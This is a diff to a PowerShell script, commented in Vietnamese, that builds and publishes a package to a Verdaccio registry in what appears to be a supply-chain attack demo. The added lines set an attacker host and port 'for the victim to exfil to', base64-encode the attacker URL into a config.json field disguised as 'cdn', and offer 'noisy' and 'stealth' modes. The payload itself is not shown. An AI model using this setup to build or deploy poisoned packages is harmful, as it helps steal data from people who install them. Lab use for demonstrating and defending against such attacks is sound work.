@@ -18,7 +18,13 @@
 
 param(
     [ValidateSet("noisy", "stealth")]
-    [string]$Mode = "noisy"
+    [string]$Mode = "noisy",
+
+    # IP LAN của máy attacker — victim sẽ exfil về IP này.
+    # Mặc định: 172.30.0.20 (Docker bridge — demo 1 máy)
+    # 2-máy: truyền vào IP LAN thật, ví dụ: -AttackerHost 192.168.1.100
+    [string]$AttackerHost = "172.30.0.20",
+    [int]$AttackerPort = 8080
 )
 
 $ErrorActionPreference = "Stop"
@@ -103,6 +109,17 @@ if ($Mode -eq "noisy") {
 $pkgJson.version = $version
 $pkgJson | ConvertTo-Json -Depth 10 | Set-Content $pkgJsonPath -Encoding UTF8
 Write-Host "  Version: $version (timestamp-based, idempotent)" -ForegroundColor Gray
+
+# Update config.json with attacker host so payload connects to correct IP
+$cfgPath = Join-Path $pkgDir "scripts\config.json"
+$cdnUrl = "http://${AttackerHost}:${AttackerPort}/"
+$cdnBase64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($cdnUrl))
+$cfg = @{ host = $AttackerHost; port = $AttackerPort; cdn = $cdnBase64 }
+$cfg | ConvertTo-Json | Set-Content $cfgPath -Encoding UTF8
+Write-Host "  Attacker host: ${AttackerHost}:${AttackerPort} (encoded in config.json)" -ForegroundColor DarkYellow
+if ($AttackerHost -ne "172.30.0.20") {
+    Write-Host "  [2-MACHINE] Victim will exfil to LAN IP: $AttackerHost" -ForegroundColor Cyan
+}
 
 # ───────────────────────────────────────────────────────────────────────────
 # Bước 3: Publish lên Verdaccio
